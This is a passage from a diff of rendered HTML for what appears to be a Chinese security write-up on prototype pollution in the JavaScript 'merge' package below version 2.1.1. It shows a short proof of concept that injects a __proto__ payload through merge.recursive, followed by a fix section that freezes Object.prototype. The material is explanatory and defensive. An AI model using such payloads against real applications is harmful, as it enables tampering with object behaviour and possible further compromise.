     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>影响2.1.1以下的merge版本</p>
+</h2><p>影响2.1.1以下的merge版本</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">merge</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">require</span>(<span style="color:#a6be9d">&#39;merge&#39;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">payload2</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JSON</span>.<span style="color:#58a1dd">parse</span>(<span style="color:#a6be9d">&#39;{&#34;x&#34;: {&#34;__proto__&#34;:{&#34;polluted&#34;:&#34;yes&#34;}}}&#39;</span>);
@@ -690,11 +734,11 @@ Function(arg0, arg1, /* … ,*/ argN, functionBody) 作者：J_Chanra https://ww
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#a6be9d">&#34;Before : &#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">obj1</span>.<span style="color:#58a1dd">polluted</span>);
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">merge</span>.<span style="color:#58a1dd">recursive</span>(<span style="color:#58a1dd">obj1</span>, <span style="color:#58a1dd">payload2</span>);
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#a6be9d">&#34;After : &#34;</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">obj1</span>.<span style="color:#58a1dd">polluted</span>);
-</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#a6be9d">&#34;After : &#34;</span> <span style="color:#ff636f">+</span> {}.<span style="color:#58a1dd">polluted</span>);</span></span></code></pre></div><h5 id="修复" class="heading-element"><span>0.0.0.5  修复</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#a6be9d">&#34;After : &#34;</span> <span style="color:#ff636f">+</span> {}.<span style="color:#58a1dd">polluted</span>);</span></span></code></pre></div><h1 id="修复" class="heading-element"><span>修复</span>
   <a href="#%e4%bf%ae%e5%a4%8d" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>1.Object.freeze()冻结原型</p>
+</h1><p>1.Object.freeze()冻结原型</p>
 <p>1.Object.freeze(Object.prototype);
 2. Object.freeze(Object);
 3. ({}).<strong>proto</strong>.test = 123
